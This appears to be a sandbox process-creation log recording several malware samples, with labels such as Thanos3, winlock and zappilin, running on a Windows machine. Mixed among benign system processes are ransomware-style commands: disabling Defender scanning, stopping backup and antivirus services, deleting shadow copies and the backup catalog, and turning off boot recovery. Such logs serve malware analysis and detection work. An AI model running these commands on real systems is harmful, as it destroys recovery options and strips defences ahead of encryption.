+48"."Thanos3"."976"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."6488"."8924"."840"."WmiPrvSE.exe"."C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+48"."Thanos3"."3780"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."4452"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."5196"."5544"."8396"."powershell.exe".""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Set-MpPreference -DisableArchiveScanning $true
+48"."Thanos3"."4372"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."4484"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."9016"."2172"."8396"."powershell.exe".""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Set-MpPreference -DisableBlockAtFirstSeen $true
+48"."Thanos3"."3060"."8768"."8396"."net.exe".""net.exe" stop BackupExecAgentBrowser /y
+48"."Thanos3"."5524"."8768"."8396"."net.exe".""net.exe" stop BackupExecDiveciMediaService /y
+48"."Thanos3"."4224"."8768"."8396"."net.exe".""net.exe" stop BackupExecJobEngine /y
+48"."Thanos3"."428"."8768"."8396"."net.exe".""net.exe" stop BackupExecManagementService /y
+48"."Thanos3"."2232"."8768"."8396"."net.exe".""net.exe" stop BackupExecRPCService /y
+48"."Thanos3"."2012"."8768"."8396"."net.exe".""net.exe" stop AcrSch2Svc /y
+48"."Thanos3"."5908"."8768"."8396"."net.exe".""net.exe" stop AcronisAgent /y
+48"."Thanos3"."4732"."8768"."8396"."net.exe".""net.exe" stop CASAD2DWebSvc /y
+48"."Thanos3"."8120"."8768"."8396"."net.exe".""net.exe" stop CAARCUpdateSvc /y
+48"."Thanos3"."8224"."8768"."8396"."net.exe".""net.exe" stop sophos /y
+48"."Thanos3"."6840"."8768"."8396"."sc.exe".""sc.exe" config SQLTELEMETRY start= disabled
+48"."Thanos3"."2760"."8768"."8396"."sc.exe".""sc.exe" config SQLTELEMETRY$ECWDB2 start= disabled
+48"."Thanos3"."5508"."8768"."8396"."sc.exe".""sc.exe" config SQLWriter start= disabled
+48"."Thanos3"."7700"."8768"."8396"."sc.exe".""sc.exe" config SstpSvc start= disabled
+48"."Thanos3"."1592"."8768"."8396"."taskkill.exe".""taskkill.exe" /IM mspub.exe /F
+48"."Thanos3"."4864"."8768"."8396"."taskkill.exe".""taskkill.exe" /IM mydesktopqos.exe /F
+48"."Thanos3"."5632"."8768"."8396"."taskkill.exe".""taskkill.exe" /IM mydesktopservice.exe /F
+48"."Thanos3"."8900"."8768"."8396"."vssadmin.exe".""vssadmin.exe" Delete Shadows /all /quiet
+48"."Thanos3"."5144"."8768"."8396"."vssadmin.exe".""vssadmin.exe" resize shadowstorage /for=c: /on=c: /maxsize=401MB
+48"."Thanos3"."9212"."8768"."8396"."vssadmin.exe".""vssadmin.exe" resize shadowstorage /for=c: /on=c: /maxsize=unbounded
+48"."Thanos3"."2616"."8768"."8396"."vssadmin.exe".""vssadmin.exe" resize shadowstorage /for=d: /on=d: /maxsize=401MB
+48"."Thanos3"."3780"."8768"."8396"."vssadmin.exe".""vssadmin.exe" resize shadowstorage /for=d: /on=d: /maxsize=unbounded
+48"."Thanos3"."4236"."8768"."8396"."vssadmin.exe".""vssadmin.exe" resize shadowstorage /for=e: /on=e: /maxsize=401MB
+48"."Thanos3"."1696"."8768"."8396"."vssadmin.exe".""vssadmin.exe" resize shadowstorage /for=e: /on=e: /maxsize=unbounded
+48"."Thanos3"."9520"."4220"."4684"."net1.exe"."C:\Windows\system32\net1 stop veeam /y
+48"."Thanos3"."4848"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."11124"."8360"."428"."net1.exe"."C:\Windows\system32\net1 stop BackupExecManagementService /y
+48"."Thanos3"."10960"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."11208"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."6484"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."10508"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."11120"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."3496"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."9904"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."4212"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."680"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."772"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."6912"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."10956"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."1460"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."9572"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."10832"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."10968"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."10300"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."9956"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."9740"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."9464"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."4848"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."5216"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."5976"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."2940"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."11108"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."8280"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."2052"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."2080"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."436"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."8652"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."7128"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."5748"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."7152"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."464"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+49"."vaggen1"."3788"."6592"."1640"."rundll32.exe"."rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh
+49"."vaggen1"."8620"."7828"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}
+49"."vaggen1"."8204"."8084"."3668"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+49"."vaggen1"."7320"."4480"."632"."consent.exe"."consent.exe 632 316 0000027DCA543C70
+49"."vaggen1"."7488"."4480"."3668"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+49"."vaggen1"."2612"."3928"."3612"."MusNotificationUx.exe"."%systemroot%\system32\MusNotificationUx.exe ClearActiveNotifications
+49"."vaggen1"."8480"."3980"."632"."wermgr.exe"."C:\Windows\system32\wermgr.exe -upload
+49"."vaggen1"."8768"."8512"."5624"."AM_Engine.exe".""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe" /LastPackage
+49"."vaggen1"."8028"."5868"."8768"."MpSigStub.exe"."C:\Windows\system32\MpSigStub.exe /stub 1.1.17600.2 /payload 1.1.17500.4 /MpWUStub /program C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe /LastPackage
+49"."vaggen1"."3836"."8088"."632"."DismHost.exe"."C:\$WinREAgent\Scratch\57EC27F5-F4D8-4D49-909B-9AF768481A41\dismhost.exe {938D3E6D-255B-4478-84C9-4F5292D0ECAF}
+50"."winlock"."5944"."9772"."840"."WmiPrvSE.exe"."C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+50"."winlock"."4496"."1408"."632"."consent.exe"."consent.exe 632 774 0000027DC746E020
+50"."winlock"."5712"."9936"."7348"."cmd.exe"."C:\Windows\system32\cmd.exe /c ""C:\Program Files (x86)\vb\wifi hacker\wh.bat""
+50"."winlock"."1564"."8352"."5712"."attrib.exe"."attrib  c:\wh\*.* -r -a -s -h
+50"."winlock"."7452"."8352"."5712"."attrib.exe"."attrib  c:\wh +r +a +s +h
+50"."winlock"."9724"."9104"."5712"."wscript.exe".""C:\Windows\System32\WScript.exe" "C:\Program Files (x86)\vb\wifi hacker\bar.vbs"
+51"."zappilin1"."10160"."8052"."632"."taskhostw.exe"."taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly
+51"."zappilin1"."7340"."3896"."840"."MoUsoCoreWorker.exe"."C:\Windows\System32\mousocoreworker.exe -Embedding
+51"."zappilin1"."580"."10388"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+51"."zappilin1"."2116"."10332"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}
+51"."zappilin1"."3804"."8540"."8776"."spoolsv.exe".""C:\Users\ejaz6\AppData\Roaming\Microsoft\Windows\spoolsv.exe" -start
+51"."zappilin1"."3632"."3972"."3668"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+51"."zappilin1"."8816"."6220"."632"."consent.exe"."consent.exe 632 316 0000027DD4C029B0
+51"."zappilin1"."8276"."6220"."3668"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+51"."zappilin1"."1916"."10576"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+51"."zappilin1"."6708"."9652"."3804"."cmd.exe".""C:\Windows\system32\cmd.exe" /C wmic shadowcopy delete
+51"."zappilin1"."4844"."9652"."3804"."cmd.exe".""C:\Windows\system32\cmd.exe" /C bcdedit /set {default} recoveryenabled no
+51"."zappilin1"."4876"."9652"."3804"."cmd.exe".""C:\Windows\system32\cmd.exe" /C bcdedit /set {default} bootstatuspolicy ignoreallfailures
+51"."zappilin1"."11140"."9652"."3804"."cmd.exe".""C:\Windows\system32\cmd.exe" /C wbadmin delete catalog -quiet
+51"."zappilin1"."8312"."9652"."3804"."cmd.exe".""C:\Windows\system32\cmd.exe" /C vssadmin delete shadows /all /quiet
+51"."zappilin1"."9504"."9652"."3804"."cmd.exe".""C:\Windows\system32\cmd.exe" /C C:\Users\ejaz6\AppData\Local\Temp\~temp001.bat
+51"."zappilin1"."2656"."9652"."3804"."spoolsv.exe".""C:\Users\ejaz6\AppData\Roaming\Microsoft\Windows\spoolsv.exe" -agent 0
+51"."zappilin1"."10124"."9652"."3804"."spoolsv.exe".""C:\Users\ejaz6\AppData\Roaming\Microsoft\Windows\spoolsv.exe" -agent 1
+51"."zappilin1"."9620"."5928"."6708"."WMIC.exe"."wmic  shadowcopy delete
+51"."zappilin1"."2152"."9496"."9504"."WMIC.exe"."wmic  shadowcopy delete
+52"."zappilin2"."8644"."5276"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+52"."zappilin2"."9932"."8968"."632"."consent.exe"."consent.exe 632 480 0000027DD148C130
+52"."zappilin2"."10704"."6192"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+52"."zappilin2"."10728"."6224"."10816"."WMIC.exe"."wmic  shadowcopy delete
+52"."zappilin2"."10320"."3780"."9424"."WMIC.exe"."wmic  shadowcopy delete
+52"."zappilin2"."10296"."2036"."840"."WmiPrvSE.exe"."C:\Windows\sysWOW64\wbem\wmiprvse.exe -secured -Embedding
+52"."zappilin2"."7164"."2920"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+52"."zappilin2"."3228"."2628"."8576"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+52"."zappilin2"."6456"."6292"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k NetworkService -p
+52"."zappilin2"."11260"."5380"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}
+52"."zappilin2"."11064"."4412"."7328"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+52"."zappilin2"."7156"."9560"."668"."wuauclt.exe".""C:\Windows\system32\wuauclt.exe" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 632586df-eef3-4e9f-b982-ce7ebbafc141 /RunHandlerComServer
+52"."zappilin2"."10760"."10732"."5308"."MpSigStub.exe"."C:\Windows\TEMP\3DD65652-FC22-4B64-99B3-BA492FF88100\MpSigStub.exe /stub 1.1.17538.0 /payload 4.18.2010.7 /program C:\Windows\SoftwareDistribution\Download\Install\updateplatform.exe
+53"."zappilin3"."6500"."10072"."9948"."OneDrive.exe"." /updateInstalled /background
+53"."zappilin3"."9852"."4964"."4644"."SearchProtocolHost.exe".""C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+53"."zappilin3"."9480"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+53"."zappilin3"."6072"."8708"."4012"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV uODtpE5WBUqhZXs8.1.2 -SendFullTelemetry -ThrottleUtc
+53"."zappilin3"."9380"."5052"."4012"."DismHost.exe"."C:\Windows\TEMP\1D966630-0DA1-4F9E-8F73-4EE481132105\dismhost.exe {E6B92287-425D-44CD-BA6C-633C17AD7AE8}
+53"."zappilin3"."1752"."4780"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+53"."zappilin3"."4832"."2788"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}
+53"."zappilin3"."2080"."2788"."840"."SecHealthUI.exe".""C:\Windows\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\SecHealthUI.exe" -ServerName:SecHealthUI.AppXep4x2tbtjws1v9qqs0rmb3hxykvkpqtn.mca
+53"."zappilin3"."10224"."2788"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {E041C90B-68BA-42C9-991E-477B73A75C90} -Embedding
+53"."zappilin3"."2904"."9056"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+53"."zappilin3"."9580"."6048"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+53"."zappilin3"."9612"."2212"."2292"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+53"."zappilin3"."7852"."9104"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k NetworkService -p
+53"."zappilin3"."3648"."2236"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}
+53"."zappilin3"."8248"."9548"."9556"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+53"."zappilin3"."4368"."6632"."2408"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+53"."zappilin3"."8872"."2300"."4012"."powershell.exe"."powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+53"."zappilin3"."7060"."7532"."668"."wuauclt.exe".""C:\Windows\system32\wuauclt.exe" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId a1747d54-1b62-4e79-a20c-08bcf85eb8f1 /RunHandlerComServer
+53"."zappilin3"."7496"."9232"."2528"."MpSigStub.exe"."C:\Windows\TEMP\784CB63C-0A53-42A0-BFBA-5F4ECE051AD3\MpSigStub.exe /stub 1.1.17538.0 /payload 4.18.2010.7 /program C:\Windows\SoftwareDistribution\Download\Install\updateplatform.exe
+54"."zappilin4"."6368"."7988"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+54"."zappilin4"."4740"."10184"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+54"."zappilin4"."10488"."7240"."2528"."SIHClient.exe"."C:\Windows\System32\sihclient.exe  /cv xfnEOXE4fEa2kq5GM+1zsA.0.2
+54"."zappilin4"."10632"."8056"."4716"."cmd.exe".""C:\Windows\system32\cmd.exe" /C wmic shadowcopy delete
+54"."zappilin4"."10640"."8056"."4716"."cmd.exe".""C:\Windows\system32\cmd.exe" /C bcdedit /set {default} recoveryenabled no
+54"."zappilin4"."10648"."8056"."4716"."cmd.exe".""C:\Windows\system32\cmd.exe" /C bcdedit /set {default} bootstatuspolicy ignoreallfailures
+54"."zappilin4"."10656"."8056"."4716"."cmd.exe".""C:\Windows\system32\cmd.exe" /C wbadmin delete catalog -quiet
+54"."zappilin4"."10664"."8056"."4716"."cmd.exe".""C:\Windows\system32\cmd.exe" /C vssadmin delete shadows /all /quiet
+54"."zappilin4"."10672"."8056"."4716"."cmd.exe".""C:\Windows\system32\cmd.exe" /C C:\Users\ejaz6\AppData\Local\Temp\~temp001.bat
+54"."zappilin4"."10680"."8056"."4716"."explorer.exe".""C:\Users\ejaz6\AppData\Roaming\Microsoft\Windows\explorer.exe" -agent 0
+54"."zappilin4"."10688"."8056"."4716"."explorer.exe".""C:\Users\ejaz6\AppData\Roaming\Microsoft\Windows\explorer.exe" -agent 1
+54"."zappilin4"."11000"."7988"."840"."WmiPrvSE.exe"."C:\Windows\sysWOW64\wbem\wmiprvse.exe -secured -Embedding
+55"."zappilin5"."11104"."6784"."7044"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV mBjH3y2Xpka7AS8o.1.2 -SendFullTelemetry -ThrottleUtc
+55"."zappilin5"."8500"."10160"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k WerSvcGroup
+55"."zappilin5"."9912"."9900"."8500"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 440 -p 10276 -ip 10276
+55"."zappilin5"."1552"."9900"."10276"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -u -p 10276 -s 1580
+55"."zappilin5"."6140"."2788"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+55"."zappilin5"."9492"."5604"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+55"."zappilin5"."10012"."2788"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+55"."zappilin5"."3084"."6784"."7044"."powershell.exe"."powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+55"."zappilin5"."3208"."8536"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+55"."zappilin5"."9996"."1728"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+55"."zappilin5"."10104"."7804"."8388"."CompatTelRunner.exe"."C:\Windows\system32\CompatTelRunner.exe -m:appraiser.dll -f:UpdateAvStatus -cv:mBjH3y2Xpka7AS8o.3
+55"."zappilin5"."3412"."7804"."8388"."CompatTelRunner.exe"."C:\Windows\system32\CompatTelRunner.exe -m:pcasvc.dll -f:QueryEncapsulationSettings -cv:mBjH3y2Xpka7AS8o.5
+55"."zappilin5"."11016"."9820"."9728"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+55"."zappilin5"."5020"."11020"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k NetworkService -p
+55"."zappilin5"."9084"."2236"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}
+55"."zappilin5"."6208"."11124"."10740"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+55"."zappilin5"."11204"."10360"."5744"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+55"."zappilin5"."11164"."11180"."668"."wuauclt.exe".""C:\Windows\system32\wuauclt.exe" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId ede09581-579c-468e-91e9-2c62ae7d54ef /RunHandlerComServer
+55"."zappilin5"."2064"."5380"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+55"."zappilin5"."6284"."5380"."840"."backgroundTaskHost.exe".""C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+55"."zappilin5"."9384"."2788"."840"."backgroundTaskHost.exe".""C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+55"."zappilin5"."10064"."5320"."8708"."MpSigStub.exe"."C:\Windows\TEMP\EEF863FC-9F02-4F42-9A9B-0DAEBCC40AC5\MpSigStub.exe /stub 1.1.17538.0 /payload 4.18.2010.7 /program C:\Windows\SoftwareDistribution\Download\Install\updateplatform.exe
+56"."zappilin6"."2192"."2788"."840"."backgroundTaskHost.exe".""C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+56"."zappilin6"."9108"."1004"."840"."backgroundTaskHost.exe".""C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+56"."zappilin6"."11108"."10900"."10896"."svchost.exe".""C:\Users\ejaz6\AppData\Roaming\Microsoft\Windows\svchost.exe" -start
+56"."zappilin6"."11188"."10632"."10628"."taskkill.exe"."taskkill  /f /im 15sp.exe
+56"."zappilin6"."11220"."10632"."10628"."taskkill.exe"."taskkill  /f /im 15sp.exe
